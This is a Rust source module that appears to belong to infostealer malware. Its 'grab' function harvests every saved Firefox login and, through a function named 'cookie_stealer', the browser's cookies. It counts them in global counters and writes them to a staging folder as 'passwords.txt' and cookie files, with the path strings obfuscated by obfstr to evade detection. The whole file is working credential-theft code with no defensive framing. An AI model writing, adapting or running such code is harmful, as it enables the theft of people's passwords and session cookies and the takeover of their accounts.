pub mod firefox;


pub async fn grab(path: String) {
    let ff_logins = firefox::get_all_logins().await.ok();
    if ff_logins.is_some() {
        let mut formatted_logins = vec![];
        if !ff_logins.as_ref().unwrap().is_empty() {
            unsafe {
                crate::PASSWORDS += ff_logins.as_ref().unwrap().len();
            }
            for (site, login) in ff_logins.unwrap().iter() {
                formatted_logins.push(format!(
                    "{} {}",
                    site,
                    format!(
                        "{}",
                        login.iter().map(|f| f.to_string()).collect::<String>()
                    )
                ));
            }

            let _ = std::fs::create_dir_all(format!(
                "{}\\{}\\",
                path,
                obfstr::obfstr!("Passwords\\Firefox")
            ));
            std::fs::write(
                format!(
                    "{}\\{}\\{}",
                    path,
                    obfstr::obfstr!("Passwords\\Firefox\\"),
                    obfstr::obfstr!("passwords.txt")
                ),
                formatted_logins.join("\r\n"),
            )
            .unwrap();
        }
    }
 
    let ff_cookies = firefox::cookie_stealer();
    unsafe {
        crate::COOKIES += ff_cookies.len();
    }
    if !ff_cookies.is_empty() {

 
        std::fs::write(
            format!(
                "{}\\{}\\{}",
                path,
                obfstr::obfstr!("cookies\\"),
                obfstr::obfstr!("Firefox_qnq0haq7.default-release.txt")
            ),
            ff_cookies.join("\r\n"),
        )
        .unwrap();
    }
}